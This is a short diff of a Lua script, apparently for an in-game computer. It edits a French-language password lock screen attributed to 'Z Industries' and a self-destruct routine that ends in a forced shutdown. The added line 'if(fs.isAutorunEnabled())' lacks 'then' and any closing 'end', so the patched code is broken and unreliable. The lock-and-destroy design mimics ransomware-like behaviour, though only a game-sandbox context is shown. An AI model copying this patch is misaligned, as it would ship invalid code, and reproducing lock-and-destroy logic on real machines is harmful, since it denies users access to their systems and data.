@@ -18,6 +18,7 @@ function Sleep(timeout)
 end
 
 function lockScreen()
+  if(fs.isAutorunEnabled())
   term.clear()
   term.write("=== Système verrouillé par Z Industries ===\n")
   term.write("Entrez le mot de passe pour déverrouiller :\n")
@@ -41,7 +42,7 @@ function selfDestruct()
     end
   end
 
-  term.write("Destruction terminée. Adieu.\n")
+  term.write("Destruction terminée.\n")
   Sleep(3)
   computer.shutdown(true)
 end
